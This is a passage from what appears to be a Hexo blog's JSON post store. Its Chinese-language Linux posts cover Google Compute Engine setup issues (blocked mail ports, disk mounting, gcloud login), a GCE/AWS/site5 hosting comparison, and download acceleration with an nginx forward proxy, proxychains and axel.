00:03:29\ntags:\n---\n\nGCE用了几个月，还算不错，挺稳定的．我也遇到几个问题，整理出来：\n\n## 无法发送邮件\n\n这个没办法，google封锁了出口流量中的25等邮件端口（还包括SSL邮件端口）．能收取，但不能向外网主机发送邮件．\n\n官方说明: [https://cloud.google.com/compute/docs/tutorials/sending-mail/](https://cloud.google.com/compute/docs/tutorials/sending-mail/) 解决办法也在这文章下面\n\n## 控制台绑定硬盘不生效\n\n还需要手动挂载到系统目录，和阿里云一样．先确认是否绑定成功，查看当前硬盘列表:\n```\n$ ls -l /dev/disk/by-id/\nlrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/google-instance-3 -> ../../sda\nlrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/google-instance-3-part1 -> ../../sda1\nlrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/google-persistent-disk-1 -> ../../sdb\nlrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3 -> ../../sda\nlrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3-part1 -> ../../sda1\nlrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/scsi-0Google_PersistentDisk_persistent-disk-1 -> ../../sdb\n\n```\nOK，可以看到 **/dev/disk/by-id/google-persistent-disk-1** 就是新创建的硬盘 **disk-1**\n\n现在需要在机器中手动挂载，比如硬盘20G **disk-1** 在 **/dev/disk/by-id/google-persistent-disk-1**，想挂载到 **/data**\n```\n$ sudo /usr/share/google/safe_format_and_mount -m \"mkfs.ext4 -F\" /dev/disk/by-id/google-persistent-disk-1 /data\nsafe_format_and_mount: Running: fsck.xfs -a /dev/disk/by-id/google-persistent-disk-1\nsafe_format_and_mount: /sbin/fsck.xfs: XFS file system.\nsafe_format_and_mount: Running: mount -o discard,defaults /dev/disk/by-id/google-persistent-disk-1 /data\n$ df -h\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        10G  7.2G  2.9G  72% /\ndevtmpfs        1.9G     0  1.9G   0% /dev\ntmpfs           1.9G     0  1.9G   0% /dev/shm\ntmpfs           1.9G  193M  1.7G  11% /run\ntmpfs           1.9G     0  1.9G   0% /sys/fs/cgroup\n/dev/sdb         20G   45M   19G   1% /data\n\n```\n可以看到生效了\n\n详细文档：[https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk](https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk)\n\n## 执行**gcloud**命令遇到 Insufficient Permission 错误\n\n这是gcloud配置还没有认证\n```\n$ sudo /usr/local/bin/gcloud auth login\n\n...  这里会给出一个授权网页链接，机器的账户授权后会给一个verification code\n\nEnter verification code: \n\n```\n&nbsp;\n\n暂时就这些．总的来说挺喜欢GCE的，而且前3个月免费哦!","slug":"gce-e7-9a-84-e4-b8-80-e4-ba-9b-e6-b3-a8-e6-84-8f-e4-ba-8b-e9-a1-b9","published":1,"updated":"2018-03-05T12:57:36.655Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhwb002blzlmh2ljxz4y","content":"<p>GCE用了几个月，还算不错，挺稳定的．我也遇到几个问题，整理出来：</p>\n<h2 id=\"无法发送邮件\"><a href=\"#无法发送邮件\" class=\"headerlink\" title=\"无法发送邮件\"></a>无法发送邮件</h2><p>这个没办法，google封锁了出口流量中的25等邮件端口（还包括SSL邮件端口）．能收取，但不能向外网主机发送邮件．</p>\n<p>官方说明: <a href=\"https://cloud.google.com/compute/docs/tutorials/sending-mail/\" target=\"_blank\" rel=\"noopener\">https://cloud.google.com/compute/docs/tutorials/sending-mail/</a> 解决办法也在这文章下面</p>\n<h2 id=\"控制台绑定硬盘不生效\"><a href=\"#控制台绑定硬盘不生效\" class=\"headerlink\" title=\"控制台绑定硬盘不生效\"></a>控制台绑定硬盘不生效</h2><p>还需要手动挂载到系统目录，和阿里云一样．先确认是否绑定成功，查看当前硬盘列表:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ls -l /dev/disk/by-id/</span><br><span class=\"line\">lrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/google-instance-3 -&gt; ../../sda</span><br><span class=\"line\">lrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/google-instance-3-part1 -&gt; ../../sda1</span><br><span class=\"line\">lrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/google-persistent-disk-1 -&gt; ../../sdb</span><br><span class=\"line\">lrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3 -&gt; ../../sda</span><br><span class=\"line\">lrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3-part1 -&gt; ../../sda1</span><br><span class=\"line\">lrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/scsi-0Google_PersistentDisk_persistent-disk-1 -&gt; ../../sdb</span><br></pre></td></tr></table></figure></p>\n<p>OK，可以看到 <strong>/dev/disk/by-id/google-persistent-disk-1</strong> 就是新创建的硬盘 <strong>disk-1</strong></p>\n<p>现在需要在机器中手动挂载，比如硬盘20G <strong>disk-1</strong> 在 <strong>/dev/disk/by-id/google-persistent-disk-1</strong>，想挂载到 <strong>/data</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo /usr/share/google/safe_format_and_mount -m &quot;mkfs.ext4 -F&quot; /dev/disk/by-id/google-persistent-disk-1 /data</span><br><span class=\"line\">safe_format_and_mount: Running: fsck.xfs -a /dev/disk/by-id/google-persistent-disk-1</span><br><span class=\"line\">safe_format_and_mount: /sbin/fsck.xfs: XFS file system.</span><br><span class=\"line\">safe_format_and_mount: Running: mount -o discard,defaults /dev/disk/by-id/google-persistent-disk-1 /data</span><br><span class=\"line\">$ df -h</span><br><span class=\"line\">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class=\"line\">/dev/sda1        10G  7.2G  2.9G  72% /</span><br><span class=\"line\">devtmpfs        1.9G     0  1.9G   0% /dev</span><br><span class=\"line\">tmpfs           1.9G     0  1.9G   0% /dev/shm</span><br><span class=\"line\">tmpfs           1.9G  193M  1.7G  11% /run</span><br><span class=\"line\">tmpfs           1.9G     0  1.9G   0% /sys/fs/cgroup</span><br><span class=\"line\">/dev/sdb         20G   45M   19G   1% /data</span><br></pre></td></tr></table></figure></p>\n<p>可以看到生效了</p>\n<p>详细文档：<a href=\"https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk\" target=\"_blank\" rel=\"noopener\">https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk</a></p>\n<h2 id=\"执行gcloud命令遇到-Insufficient-Permission-错误\"><a href=\"#执行gcloud命令遇到-Insufficient-Permission-错误\" class=\"headerlink\" title=\"执行gcloud命令遇到 Insufficient Permission 错误\"></a>执行<strong>gcloud</strong>命令遇到 Insufficient Permission 错误</h2><p>这是gcloud配置还没有认证<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo /usr/local/bin/gcloud auth login</span><br><span class=\"line\"></span><br><span class=\"line\">...  这里会给出一个授权网页链接，机器的账户授权后会给一个verification code</span><br><span class=\"line\"></span><br><span class=\"line\">Enter verification code:</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>暂时就这些．总的来说挺喜欢GCE的，而且前3个月免费哦!</p>\n","site":{"data":{}},"excerpt":"","more":"<p>GCE用了几个月，还算不错，挺稳定的．我也遇到几个问题，整理出来：</p>\n<h2 id=\"无法发送邮件\"><a href=\"#无法发送邮件\" class=\"headerlink\" title=\"无法发送邮件\"></a>无法发送邮件</h2><p>这个没办法，google封锁了出口流量中的25等邮件端口（还包括SSL邮件端口）．能收取，但不能向外网主机发送邮件．</p>\n<p>官方说明: <a href=\"https://cloud.google.com/compute/docs/tutorials/sending-mail/\" target=\"_blank\" rel=\"noopener\">https://cloud.google.com/compute/docs/tutorials/sending-mail/</a> 解决办法也在这文章下面</p>\n<h2 id=\"控制台绑定硬盘不生效\"><a href=\"#控制台绑定硬盘不生效\" class=\"headerlink\" title=\"控制台绑定硬盘不生效\"></a>控制台绑定硬盘不生效</h2><p>还需要手动挂载到系统目录，和阿里云一样．先确认是否绑定成功，查看当前硬盘列表:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ls -l /dev/disk/by-id/</span><br><span class=\"line\">lrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/google-instance-3 -&gt; ../../sda</span><br><span class=\"line\">lrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/google-instance-3-part1 -&gt; ../../sda1</span><br><span class=\"line\">lrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/google-persistent-disk-1 -&gt; ../../sdb</span><br><span class=\"line\">lrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3 -&gt; ../../sda</span><br><span class=\"line\">lrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3-part1 -&gt; ../../sda1</span><br><span class=\"line\">lrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/scsi-0Google_PersistentDisk_persistent-disk-1 -&gt; ../../sdb</span><br></pre></td></tr></table></figure></p>\n<p>OK，可以看到 <strong>/dev/disk/by-id/google-persistent-disk-1</strong> 就是新创建的硬盘 <strong>disk-1</strong></p>\n<p>现在需要在机器中手动挂载，比如硬盘20G <strong>disk-1</strong> 在 <strong>/dev/disk/by-id/google-persistent-disk-1</strong>，想挂载到 <strong>/data</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo /usr/share/google/safe_format_and_mount -m &quot;mkfs.ext4 -F&quot; /dev/disk/by-id/google-persistent-disk-1 /data</span><br><span class=\"line\">safe_format_and_mount: Running: fsck.xfs -a /dev/disk/by-id/google-persistent-disk-1</span><br><span class=\"line\">safe_format_and_mount: /sbin/fsck.xfs: XFS file system.</span><br><span class=\"line\">safe_format_and_mount: Running: mount -o discard,defaults /dev/disk/by-id/google-persistent-disk-1 /data</span><br><span class=\"line\">$ df -h</span><br><span class=\"line\">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class=\"line\">/dev/sda1        10G  7.2G  2.9G  72% /</span><br><span class=\"line\">devtmpfs        1.9G     0  1.9G   0% /dev</span><br><span class=\"line\">tmpfs           1.9G     0  1.9G   0% /dev/shm</span><br><span class=\"line\">tmpfs           1.9G  193M  1.7G  11% /run</span><br><span class=\"line\">tmpfs           1.9G     0  1.9G   0% /sys/fs/cgroup</span><br><span class=\"line\">/dev/sdb         20G   45M   19G   1% /data</span><br></pre></td></tr></table></figure></p>\n<p>可以看到生效了</p>\n<p>详细文档：<a href=\"https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk\" target=\"_blank\" rel=\"noopener\">https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk</a></p>\n<h2 id=\"执行gcloud命令遇到-Insufficient-Permission-错误\"><a href=\"#执行gcloud命令遇到-Insufficient-Permission-错误\" class=\"headerlink\" title=\"执行gcloud命令遇到 Insufficient Permission 错误\"></a>执行<strong>gcloud</strong>命令遇到 Insufficient Permission 错误</h2><p>这是gcloud配置还没有认证<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo /usr/local/bin/gcloud auth login</span><br><span class=\"line\"></span><br><span class=\"line\">...  这里会给出一个授权网页链接，机器的账户授权后会给一个verification code</span><br><span class=\"line\"></span><br><span class=\"line\">Enter verification code:</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>暂时就这些．总的来说挺喜欢GCE的，而且前3个月免费哦!</p>\n"},{"title":"GCE,AWS,site5主机小对比","id":"56","date":"2015-06-03T15:08:32.000Z","_content":"\n最近分别用了这三家的主机，因为是博客，对于运行速度和软件生态没有要求．\n\n主要是价格和连接速度的比较：\n\n#### 价格\n\n*   AWS 新用户可以免费用micro用一年，还有RDS数据库也可以用一年．不过后面费用就有点贵了，日本机房 t2.small 1CPU, 2GB $21.90/月\n*   GCE  (google Compute Engine) 可以免费三个月,之后 1CPU,1.7GB $17/月\n*   site5 没有任何优惠活动，2CPU,1GB $27.5/月\n\n#### 速度\n\n*   AWS 日本，大陆ping在150-300之间，速度一般\n*   GCE 台湾，大陆ping50-100左右．没有遇到过\"超时\"的情况\n*   site5 香港，用的好像是IBM softlayer的机房，ping 30左右，广东地区可以到10+，非常流畅，适合搭代理\n*   IBM softlayer在香港的机房一直很想买，无奈起步价太贵了\n\n### 软件\n\n*   AWS 毫无疑问很丰富，但对于博客来说大炮打蚊子\n*   GCE 也没什么问题，唯一一个就是发不了邮件，google自己封锁了邮件发送端口，能收但不能往外发，只能专门购买其它家的邮件服务\n*   site5 基本没什么管理功能，缺少镜像快照支持，升级机器也很不方便\n*   以上这三家都支持Centos7.0 64bit\n综合各方面，最后决定继续使用google的服务\n\nPS. 之前是想用腾讯云香港机房的，不过香港机房也要求备案了，好麻烦算了","source":"_posts/gceawssite5-e4-b8-bb-e6-9c-ba-e5-b0-8f-e5-af-b9-e6-af-94.md","raw":"---\ntitle: 'GCE,AWS,site5主机小对比'\nid: 56\ncategories:\n  - linux\ndate: 2015-06-03 23:08:32\ntags:\n---\n\n最近分别用了这三家的主机，因为是博客，对于运行速度和软件生态没有要求．\n\n主要是价格和连接速度的比较：\n\n#### 价格\n\n*   AWS 新用户可以免费用micro用一年，还有RDS数据库也可以用一年．不过后面费用就有点贵了，日本机房 t2.small 1CPU, 2GB $21.90/月\n*   GCE  (google Compute Engine) 可以免费三个月,之后 1CPU,1.7GB $17/月\n*   site5 没有任何优惠活动，2CPU,1GB $27.5/月\n\n#### 速度\n\n*   AWS 日本，大陆ping在150-300之间，速度一般\n*   GCE 台湾，大陆ping50-100左右．没有遇到过\"超时\"的情况\n*   site5 香港，用的好像是IBM softlayer的机房，ping 30左右，广东地区可以到10+，非常流畅，适合搭代理\n*   IBM softlayer在香港的机房一直很想买，无奈起步价太贵了\n\n### 软件\n\n*   AWS 毫无疑问很丰富，但对于博客来说大炮打蚊子\n*   GCE 也没什么问题，唯一一个就是发不了邮件，google自己封锁了邮件发送端口，能收但不能往外发，只能专门购买其它家的邮件服务\n*   site5 基本没什么管理功能，缺少镜像快照支持，升级机器也很不方便\n*   以上这三家都支持Centos7.0 64bit\n综合各方面，最后决定继续使用google的服务\n\nPS. 之前是想用腾讯云香港机房的，不过香港机房也要求备案了，好麻烦算了","slug":"gceawssite5-e4-b8-bb-e6-9c-ba-e5-b0-8f-e5-af-b9-e6-af-94","published":1,"updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhwc002dlzlm3zpmptja","content":"<p>最近分别用了这三家的主机，因为是博客，对于运行速度和软件生态没有要求．</p>\n<p>主要是价格和连接速度的比较：</p>\n<h4 id=\"价格\"><a href=\"#价格\" class=\"headerlink\" title=\"价格\"></a>价格</h4><ul>\n<li>AWS 新用户可以免费用micro用一年，还有RDS数据库也可以用一年．不过后面费用就有点贵了，日本机房 t2.small 1CPU, 2GB $21.90/月</li>\n<li>GCE  (google Compute Engine) 可以免费三个月,之后 1CPU,1.7GB $17/月</li>\n<li>site5 没有任何优惠活动，2CPU,1GB $27.5/月</li>\n</ul>\n<h4 id=\"速度\"><a href=\"#速度\" class=\"headerlink\" title=\"速度\"></a>速度</h4><ul>\n<li>AWS 日本，大陆ping在150-300之间，速度一般</li>\n<li>GCE 台湾，大陆ping50-100左右．没有遇到过”超时”的情况</li>\n<li>site5 香港，用的好像是IBM softlayer的机房，ping 30左右，广东地区可以到10+，非常流畅，适合搭代理</li>\n<li>IBM softlayer在香港的机房一直很想买，无奈起步价太贵了</li>\n</ul>\n<h3 id=\"软件\"><a href=\"#软件\" class=\"headerlink\" title=\"软件\"></a>软件</h3><ul>\n<li>AWS 毫无疑问很丰富，但对于博客来说大炮打蚊子</li>\n<li>GCE 也没什么问题，唯一一个就是发不了邮件，google自己封锁了邮件发送端口，能收但不能往外发，只能专门购买其它家的邮件服务</li>\n<li>site5 基本没什么管理功能，缺少镜像快照支持，升级机器也很不方便</li>\n<li>以上这三家都支持Centos7.0 64bit<br>综合各方面，最后决定继续使用google的服务</li>\n</ul>\n<p>PS. 之前是想用腾讯云香港机房的，不过香港机房也要求备案了，好麻烦算了</p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近分别用了这三家的主机，因为是博客，对于运行速度和软件生态没有要求．</p>\n<p>主要是价格和连接速度的比较：</p>\n<h4 id=\"价格\"><a href=\"#价格\" class=\"headerlink\" title=\"价格\"></a>价格</h4><ul>\n<li>AWS 新用户可以免费用micro用一年，还有RDS数据库也可以用一年．不过后面费用就有点贵了，日本机房 t2.small 1CPU, 2GB $21.90/月</li>\n<li>GCE  (google Compute Engine) 可以免费三个月,之后 1CPU,1.7GB $17/月</li>\n<li>site5 没有任何优惠活动，2CPU,1GB $27.5/月</li>\n</ul>\n<h4 id=\"速度\"><a href=\"#速度\" class=\"headerlink\" title=\"速度\"></a>速度</h4><ul>\n<li>AWS 日本，大陆ping在150-300之间，速度一般</li>\n<li>GCE 台湾，大陆ping50-100左右．没有遇到过”超时”的情况</li>\n<li>site5 香港，用的好像是IBM softlayer的机房，ping 30左右，广东地区可以到10+，非常流畅，适合搭代理</li>\n<li>IBM softlayer在香港的机房一直很想买，无奈起步价太贵了</li>\n</ul>\n<h3 id=\"软件\"><a href=\"#软件\" class=\"headerlink\" title=\"软件\"></a>软件</h3><ul>\n<li>AWS 毫无疑问很丰富，但对于博客来说大炮打蚊子</li>\n<li>GCE 也没什么问题，唯一一个就是发不了邮件，google自己封锁了邮件发送端口，能收但不能往外发，只能专门购买其它家的邮件服务</li>\n<li>site5 基本没什么管理功能，缺少镜像快照支持，升级机器也很不方便</li>\n<li>以上这三家都支持Centos7.0 64bit<br>综合各方面，最后决定继续使用google的服务</li>\n</ul>\n<p>PS. 之前是想用腾讯云香港机房的，不过香港机房也要求备案了，好麻烦算了</p>\n"},{"title":"linux下载文件加速方法","id":"278","date":"2016-01-24T11:31:01.000Z","_content":"\n有时候要下载一些墙外的文件会非常慢，比如github的仓库包，因为存放在AWS上，国内下载速度很慢。\n\n下面是我整理了一些加速的方法：\n\n## nginx搭建正向代理服务器\n\n首先需要一个海外的服务器，这里推荐Google Computer Engine (台湾)的机器，大约$7/月最低配的机器即可。\n\n这里搭建了一个nginx的正向代理，通过链接中的规则请求下载地址。\n\n配置规则：\n\n```\n    server {\n        listen    80;\n        server_name ~^(?<domain>.+)\\.proxy.xiaoai.me$;\n\n        location / {\n            resolver 8.8.8.8;\n            proxy_pass $scheme://$domain;\n            proxy_set_header Host $domain;\n            proxy_pass_request_headers      on;\n        }\n    }\n```\n\n比如想下载：https://nodejs.org/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz  很慢\n这时候可以给链接加个正向代理的域名： http://nodejs.org.proxy.xiaoai.me/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz 通过代理，速度会更快。\n\n## proxychains 命令行设置代理\n\n有些情况下无法更改域名，比如composer更新。这时候可以通过proxychains配置SOCKS5或HTTP代理服务，然后在命令行加速。\n\n```\n$ proxychains composer update\n```\n\nproxychains的方式不是全局的，所以只针对后面命令的进程设置代理配置。不会影响其它的进程，非常有用。\n\n## Axel 多线程下载\n\naxel是一个命令行下的工具。比起`wget`，它支持同时开启多个HTTP连接。利用HTTP的分段传输特性`Range: bytes=1024-2048`实现了加速下载。\n","source":"_posts/linux-e4-b8-8b-e8-bd-bd-e6-96-87-e4-bb-b6-e5-8a-a0-e9-80-9f-e6-96-b9-e6-b3-95.md","raw":"---\ntitle: linux下载文件加速方法\nid: 278\ncategories:\n  - linux\ndate: 2016-01-24 19:31:01\ntags:\n---\n\n有时候要下载一些墙外的文件会非常慢，比如github的仓库包，因为存放在AWS上，国内下载速度很慢。\n\n下面是我整理了一些加速的方法：\n\n## nginx搭建正向代理服务器\n\n首先需要一个海外的服务器，这里推荐Google Computer Engine (台湾)的机器，大约$7/月最低配的机器即可。\n\n这里搭建了一个nginx的正向代理，通过链接中的规则请求下载地址。\n\n配置规则：\n\n```\n    server {\n        listen    80;\n        server_name ~^(?<domain>.+)\\.proxy.xiaoai.me$;\n\n        location / {\n            resolver 8.8.8.8;\n            proxy_pass $scheme://$domain;\n            proxy_set_header Host $domain;\n            proxy_pass_request_headers      on;\n        }\n    }\n```\n\n比如想下载：https://nodejs.org/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz  很慢\n这时候可以给链接加个正向代理的域名： http://nodejs.org.proxy.xiaoai.me/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz 通过代理，速度会更快。\n\n## proxychains 命令行设置代理\n\n有些情况下无法更改域名，比如composer更新。这时候可以通过proxychains配置SOCKS5或HTTP代理服务，然后在命令行加速。\n\n```\n$ proxychains composer update\n```\n\nproxychains的方式不是全局的，所以只针对后面命令的进程设置代理配置。不会影响其它的进程，非常有用。\n\n## Axel 多线程下载\n\naxel是一个命令行下的工具。比起`wget`，它支持同时开启多个HTTP连接。利用HTTP的分段传输特性`Range: bytes=1024-2048`实现了加速下载。\n","slug":"linux-e4-b8-8b-e8-bd-bd-e6-96-87-e4-bb-b6-e5-8a-a0-e9-80-9f-e6-96-b9-e6-b3-95","published":1,"updated":"2018-03-05T13:10:01.655Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhwe002flzlm7xaqv4ln","content":"<p>有时候要下载一些墙外的文件会非常慢，比如github的仓库包，因为存放在AWS上，国内下载速度很慢。</p>\n<p>下面是我整理了一些加速的方法：</p>\n<h2 id=\"nginx搭建正向代理服务器\"><a href=\"#nginx搭建正向代理服务器\" class=\"headerlink\" title=\"nginx搭建正向代理服务器\"></a>nginx搭建正向代理服务器</h2><p>首先需要一个海外的服务器，这里推荐Google Computer Engine (台湾)的机器，大约$7/月最低配的机器即可。</p>\n<p>这里搭建了一个nginx的正向代理，通过链接中的规则请求下载地址。</p>\n<p>配置规则：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen    80;</span><br><span class=\"line\">    server_name ~^(?&lt;domain&gt;.+)\\.proxy.xiaoai.me$;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        resolver 8.8.8.8;</span><br><span class=\"line\">        proxy_pass $scheme://$domain;</span><br><span class=\"line\">        proxy_set_header Host $domain;</span><br><span class=\"line\">        proxy_pass_request_headers      on;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>比如想下载：<a href=\"https://nodejs.org/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz\" target=\"_blank\" rel=\"noopener\">https://nodejs.org/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz</a>  很慢<br>这时候可以给链接加个正向代理的域名： <a href=\"http://nodejs.org.proxy.xiaoai.me/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz\" target=\"_blank\" rel=\"noopener\">http://nodejs.org.proxy.xiaoai.me/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz</a> 通过代理，速度会更快。</p>\n<h2 id=\"proxychains-命令行设置代理\"><a href=\"#proxychains-命令行设置代理\" class=\"headerlink\" title=\"proxychains 命令行设置代理\"></a>proxychains 命令行设置代理</h2><p>有些情况下无法更改域名，比如composer更新。这时候可以通过proxychains配置SOCKS5或HTTP代理服务，然后在命令行加速。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ proxychains composer update</span><br></pre></td></tr></table></figure>\n<p>proxychains的方式不是全局的，所以只针对后面命令的进程设置代理配置。不会影响其它的进程，非常有用。</p>\n<h2 id=\"Axel-多线程下载\"><a href=\"#Axel-多线程下载\" class=\"headerlink\" title=\"Axel 多线程下载\"></a>Axel 多线程下载</h2><p>axel是一个命令行下的工具。比起<code>wget</code>，它支持同时开启多个HTTP连接。利用HTTP的分段传输特性<code>Range: bytes=1024-2048</code>实现了加速下载。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>有时候要下载一些墙外的文件会非常慢，比如github的仓库包，因为存放在AWS上，国内下载速度很慢。</p>\n<p>下面是我整理了一些加速的方法：</p>\n<h2 id=\"nginx搭建正向代理服务器\"><a href=\"#nginx搭建正向代理服务器\" class=\"headerlink\" title=\"nginx搭建正向代理服务器\"></a>nginx搭建正向代理服务器</h2><p>首先需要一个海外的服务器，这里推荐Google Computer Engine (台湾)的机器，大约$7/月最低配的机器即可。</p>\n<p>这里搭建了一个nginx的正向代理，通过链接中的规则请求下载地址。</p>\n<p>配置规则：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen    80;</span><br><span class=\"line\">    server_name ~^(?&lt;domain&gt;.+)\\.proxy.xiaoai.me$;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        resolver 8.8.8.8;</span><br><span class=\"line\">        proxy_pass $scheme://$domain;</span><br><span class=\"line\">        proxy_set_header Host $domain;</span><br><span class=\"line\">        proxy_pass_request_headers      on;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>比如想下载：<a href=\"https://nodejs.org/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz\" target=\"_blank\" rel=\"noopener\">https://nodejs.org/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz</a>  很慢<br>这时候可以给链接加个正向代理的域名： <a href=\"http://nodejs.org.proxy.xiaoai.me/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz\" target=\"_blank\" rel=\"noopener\">http://nodejs.org.proxy.xiaoai.me/dist/v5.5.0/node-v5.5.0-linux-x64.tar.xz</a> 通过代理，速度会更快。</p>\n<h2 id=\"proxychains-命令行设置代理\"><a href=\"#proxychains-命令行设置代理\" class=\"headerlink\" title=\"proxychains 命令行设置代理\"></a>proxychains 命令行设置代理</h2><p>有些情况下无法更改域名，比如composer更新。这时候可以通过proxychains配置SOCKS5或HTTP代理服务，然后在命令行加速。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ proxychains composer update</span><br></pre></td></tr></table></figure>\n<p>proxychains的方式不是全局的，所以只针对后面命令的进程设置代理配置。不会影响其它的进程，非常有用。</p>\n<h2 id=\"Axel-多线程下载\"><a href=\"#Axel-多线程下载\" class=\"headerlink\" title=\"Axel 多线程下载\"></a>Axel 多线程下载</h2><p>axel是一个命令行下的工具。比起<code>wget</code>，它支持同时开启多个HTTP连接。利用HTTP的分段传输特性<code>Range: 